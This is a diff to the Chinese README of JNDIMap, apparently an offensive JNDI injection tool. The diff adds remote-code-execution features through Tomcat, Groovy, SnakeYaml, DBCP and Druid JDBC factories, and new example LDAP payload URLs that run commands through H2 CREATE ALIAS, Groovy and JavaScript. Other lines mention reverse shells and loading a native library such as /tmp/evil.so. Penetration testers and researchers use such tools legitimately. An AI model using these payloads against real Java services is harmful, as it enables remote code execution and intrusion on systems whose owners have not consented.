@@ -8,9 +8,10 @@ JNDIMap 是一个 JNDI 注入利用工具, 支持 RMI 和 LDAP 协议
 - 命令执行
 - 原生反弹 Shell (支持 Windows)
 - 加载自定义 Class 字节码
-- Tomcat/Groovy/SnakeYaml 绕过高版本 JDK
-- MLet 探测可用 Gadget
+- Tomcat/Groovy/SnakeYaml RCE
+- Commons/Tomcat DBCP, Alibaba Druid JDBC RCE
 - NativeLibLoader 加载动态链接库
+- MLet 探测可用 Gadget
 - LDAP 反序列化
 
 ## Compile
@@ -26,7 +27,7 @@ mvn package -Dmaven.test.skip=true
 ## Usage
 
 ```bash
-Help: java -jar JNDIMap.jar [-i <ip>] [-r <rmiPort>] [-l <ldapPort>] [-p <httpPort>] [-u] [-h]
+Usage: java -jar JNDIMap.jar [-i <ip>] [-r <rmiPort>] [-l <ldapPort>] [-p <httpPort>] [-h]
 ````
 
 `-i`: 服务器监听 IP (即 codebase, 必须指定为一个目标可访问到的 IP, 例如 `192.168.1.100`, 不能用 `0.0.0.0`)
@@ -37,9 +38,7 @@ Help: java -jar JNDIMap.jar [-i <ip>] [-r <rmiPort>] [-l <ldapPort>] [-p <httpPo
 
 `-p`: HTTP 服务器监听端口, 默认为 `3456`
 
-`-u`: 显示 JNDI URL 信息
-
-`-h`: 显示 Help 信息
+`-h`: 显示 Usage 信息
 
 ## JNDI URL
 
@@ -85,6 +84,15 @@ ldap://127.0.0.1:1389/MLet/com.example.TestClass
 # 注意传入的 path 为绝对路径, 且不能包含后缀名
 # 例如: 服务器上存在 /tmp/evil.so, 则 path 为 /tmp/evil
 ldap://127.0.0.1:1389/NativeLibLoader/<base64-path-to-native-library>
+
+# Commons/Tomcat DBCP, Alibaba Druid JDBC RCE
+# 将以下的 Factory 替换为 CommonsDbcp1, CommonsDbcp2, TomcatDbcp1, TomcatDbcp2, Druid 其中之一
+
+# H2 RCE
+# 三种方式: CREATE ALIAS/Groovy/JavaScript (ScriptEngine)
+ldap://127.0.0.1:1389/Factory/H2/Alias/open -a Calculator
+ldap://127.0.0.1:1389/Factory/H2/Groovy/open -a Calculator
+ldap://127.0.0.1:1389/Factory/H2/JavaScript/open -a Calculator
 
 # 自定义数据 反序列化
 ldap://127.0.0.1:1389/Deserialize/<base64-serialize-data>
